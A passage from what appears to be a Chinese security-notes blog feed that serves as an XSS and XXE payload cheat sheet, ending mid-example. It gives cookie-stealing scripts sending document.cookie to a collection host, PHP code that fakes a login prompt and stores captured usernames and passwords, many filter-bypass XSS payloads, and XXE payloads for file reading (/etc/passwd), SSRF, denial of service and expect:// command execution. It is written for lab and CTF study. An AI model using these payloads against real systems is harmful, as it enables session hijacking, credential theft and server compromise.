Stored XSS）"></a>存储型XSS（Persistent or Stored XSS）</h2><p>存储型XSS具有持久性特点。攻击者将恶意脚本永久地存储在目标服务器上，每当任何用户访问到包含此类恶意内容的页面时，浏览器都会执行其中的恶意脚本。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="基于DOM的XSS（DOM-Based-XSS）"><a href="#基于DOM的XSS（DOM-Based-XSS）" class="headerlink" title="基于DOM的XSS（DOM-Based XSS）"></a>基于DOM的XSS（DOM-Based XSS）</h2><p>这种类型的XSS不涉及服务器端的数据存储，而是发生在客户端层面，即浏览器解析和动态修改DOM树的过程中。如果Web应用程序错误地使用来自不可信源的数据更新DOM，并且没有实施恰当的防御措施，攻击者就可以利用DOM-XSS漏洞注入恶意脚本。</p><p>不涉及服务器端，而是由前端JavaScript代码错误处理用户输入导致的。当浏览器DOM解析过程中引入了不可信的数据并且没有正确地对其进行净化，就会产生DOM-Based XSS。</p><h2 id="xss无过滤常见标签"><a href="#xss无过滤常见标签" class="headerlink" title="xss无过滤常见标签"></a>xss无过滤常见标签</h2><p>弹窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;1&quot;</span>);&lt;/script&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">prompt</span>(<span class="hljs-string">&quot;2&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;3&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;1&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>JS支持unicode编码，但是不可以对script标签进行编码</p><h2 id="XSS获取cookie"><a href="#XSS获取cookie" class="headerlink" title="XSS获取cookie"></a>XSS获取cookie</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27;&quot;&gt;&lt;script&gt;document.location.href=&#x27;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//192.168.31.110/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><h2 id="XSS钓鱼"><a href="#XSS钓鱼" class="headerlink" title="XSS钓鱼"></a>XSS钓鱼</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script src=<span class="hljs-string">&quot;http://192.168.31.172/pikachu/pkxss/xfish/fish.php&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><figure class="highlight php"><figcaption><span>file:fish.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// var_dump($_SERVER);</span><br><span class="hljs-keyword">if</span> ((!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_USER&#x27;</span>])) || (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_PW&#x27;</span>]))) &#123;<br><span class="hljs-comment">//发送认证框，并给出迷惑性的info</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;WWW-Authenticate: Basic realm=&#x27;认证&#x27;&quot;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Authorization Required.&#x27;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_USER&#x27;</span>])) &amp;&amp; (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_PW&#x27;</span>])))&#123;<br><span class="hljs-comment">//将结果发送给搜集信息的后台,请将这里的IP地址修改为管理后台的IP</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://192.168.1.15/pkxss/xfish/xfish.php?username=<span class="hljs-subst">&#123;$_SERVER[PHP_AUTH_USER]&#125;</span>&amp;password=<span class="hljs-subst">&#123;$_SERVER[PHP_AUTH_PW]&#125;</span>&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><figcaption><span>file:xfish.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;../inc/config.inc.php&#x27;</span>;<br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;../inc/mysql.inc.php&#x27;</span>;<br><span class="hljs-variable">$link</span>=<span class="hljs-title function_ invoke__">connect</span>();<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$referer</span>=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable">$referer</span>.=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br>    <span class="hljs-variable">$time</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d g:i:s&#x27;</span>);<br>    <span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;insert fish(time,username,password,referer) </span><br><span class="hljs-string">    values(&#x27;<span class="hljs-subst">$time</span>&#x27;,&#x27;<span class="hljs-subst">$username</span>&#x27;,&#x27;<span class="hljs-subst">$password</span>&#x27;,&#x27;<span class="hljs-subst">$referer</span>&#x27;)&quot;</span>;<br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$link</span>, <span class="hljs-variable">$query</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h2><figure class="highlight js"><figcaption><span>file:base.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;scirpt&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>);&lt;/script&gt;<br><br>#图片加载错误触发<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;<br>&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#x27;xss&#x27;)&quot;)&gt;<br><br>#鼠标指针移动到元素时触发  <br>&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;<br>#鼠标指针移出时触发  <br>&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;<br><br>#js伪协议<br>&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;<br>&lt;iframe src=javascript:alert(&#x27;xss&#x27;);&gt;&lt;/iframe&gt;<br>&lt;img src=javascript:alert(&#x27;xss&#x27;)&gt;<br>&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;<br><br>&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br>竞争焦点，从而触发onblur事件<br>&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;<br>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<br>&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;<br>&lt;input value=&quot;&quot; onclick=alert(&#x27;xss&#x27;) type=&quot;text&quot;&gt;<br>&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#x27;xss&#x27;) bad=&quot;&quot;&gt;<br>&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="XSS过滤绕过"><a href="#XSS过滤绕过" class="headerlink" title="XSS过滤绕过"></a>XSS过滤绕过</h2><p>前端过滤：抓包重发或者修改HTML<br>后端正则过滤：大小写混合输入</p><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>用<code>/</code>替代<br><code>&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</code></p><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p>大小写绕过<br><code>&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;</code><br>双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)<br><code>&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">eval</span>字符拼接<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;a=aler;b=t;c=&#x27;(xss);&#x27;;eval(a+b+c)&quot;</span>&gt;<br>top字符拼接<br>&lt;script&gt;top[<span class="hljs-string">&quot;al&quot;</span>+<span class="hljs-string">&quot;ert&quot;</span>](<span class="hljs-string">`xss`</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Unicode</span>编码绕过<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;</span>&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;&gt;<br><br>url编码绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt;<br>&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;<br><br>Ascii码绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;<br><br>Hex绕过<br>&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;<br><br>八进制绕过<br>&lt;img src=x onerror=alert(&#x27;\170\163\163&#x27;)&gt;<br><br>base64绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;&gt;<br>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;<br></code></pre></td></tr></table></figure><h3 id="过滤双引号，单引号"><a href="#过滤双引号，单引号" class="headerlink" title="过滤双引号，单引号"></a>过滤双引号，单引号</h3><p>如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-string">``</span>xss<span class="hljs-string">``</span>);&gt;<br></code></pre></td></tr></table></figure><p>使用编码绕过，具体看上面列举的例子</p><h3 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h3><p>当括号被过滤的时候可以使用<code>throw</code>来绕过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;svg/onload=<span class="hljs-string">&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">使用url编码<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`</span>&gt;<br>使用<span class="hljs-variable constant_">IP</span><br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">`http://2130706433/`</span>&gt;十进制<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">`http://0177.0.0.01/`</span>&gt;八进制<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">`http://0x7f.0x0.0x0.0x1/`</span>&gt;十六进制<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">`//www.baidu.com`</span>&gt;html标签中用<span class="hljs-comment">//  可以代替http://</span><br>使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在<span class="hljs-title class_">Windows</span>下是file协议，在linux下才会是当前域的协议)<br>使用中文逗号代替英文逗号<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;document.location=http://www。baidu。com&quot;</span>&gt;<span class="hljs-comment">//会自动跳转到百度</span><br></code></pre></td></tr></table></figure><h2 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h2><p><code>&#39; oninput=alert(&quot;1&quot;)//</code>，<code>&#39; onclick=&#39;alert(document.cookie)&#39;//</code>绕过尖括号的实体化，用<code>&#39;</code>闭合</p><p><code>&quot;&gt; &lt;a href=javascript:alert()&gt;xxx&lt;/a&gt; &lt;&quot;</code> 绕过on和&lt;script过滤</p><p>href的隐藏属性自动Unicode解码 绕过<code>&quot;</code>、<code>script</code>、<code>on</code>、<code>src</code>、<code>href</code></p><p><code>html编码</code>后的内容可以绕过后端的过滤，但拼接到前端后，就会被浏览器解码，重新变回字母。例如<code>java&amp;#115;cript:alert(8)</code></p><p><code>&lt;input name=&quot;t_sort&quot; value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code>对于隐藏且过滤<code>&lt;&gt;</code>的，使用<code>&quot; oninput=alert(&#39;1&#39;) type=&quot;text</code>“闭合，注意要有空格</p><p><code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code>图片加载报错<br><code>&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;</code>鼠标指针移动到元素时触发<br><code>&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;</code>鼠标指针移出时触发</p><p>左右尖括号和单引号都被html编码<code>javascript:alert(document.cookie)</code></p><p><code>&#39;&gt;&lt;img src=&#39;#&#39; onerror=&quot;alert(&#39;xss&#39;)&quot;&gt;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE-XML</title>
    <link href="/2025/03/22/XXE-XML/"/>
    <url>/2025/03/22/XXE-XML/</url>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/8041?time__1311=n4+xnD0Dc7=YqD5eGN3xCwwBititC3tHTe4D#toc-3">https://xz.aliyun.com/t/8041?time__1311&#x3D;n4%2BxnD0Dc7%3DYqD5eGN3xCwwBititC3tHTe4D#toc-3</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p><p><a href="https://evilpan.com/2024/06/02/xml-vulnerabilities/#%E5%89%8D%E8%A8%80">https://evilpan.com/2024/06/02/xml-vulnerabilities/#%E5%89%8D%E8%A8%80</a></p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。<br>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。<br>目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。</p><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>XML 文档在开头有 <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 的结构，这种结构被称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，但是必须放在文档开头。</p><p>除了可选的开头外，XML 语法主要有以下的特性：</p><ul><li>所有 XML 元素都须有关闭标签</li><li>XML 标签对大小写敏感</li><li>XML 必须正确地嵌套</li><li>XML 文档必须有根元素</li><li>XML 的属性值需要加引号</li></ul><p>另外，XML也有CDATA语法，用于处理有多个字符需要转义的情况。</p><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>当允许引用外部实体时，可通过构造恶意的XML内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的XXE攻击，只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，但是也可以通过Blind XXE的方式实现攻击。</p><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">data</span> (<span class="hljs-keyword">#ANY</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY a0 <span class="hljs-string">&quot;dos&quot;</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">a1</span> <span class="hljs-string">&quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">a2</span> <span class="hljs-string">&quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span>&amp;a2;<span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><p>若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。</p><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">data</span> (<span class="hljs-keyword">#ANY</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">payload</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;payload;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://publicServer.com/&quot;</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">data</span> (<span class="hljs-keyword">#ANY</span>)&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">GVI</span> [ <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">catalog</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">core</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;test101&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">core</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">catalog</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span> <span class="hljs-attr">xmlns:xi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xi:include</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://publicServer.com/file.xml&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xi:include</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h2><p><code>cat 1.xml | iconv -f UTF-8 -t UTF-16BE &gt; 16.xml</code>编码绕过</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><figure class="highlight python"><figcaption><span>file:app.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 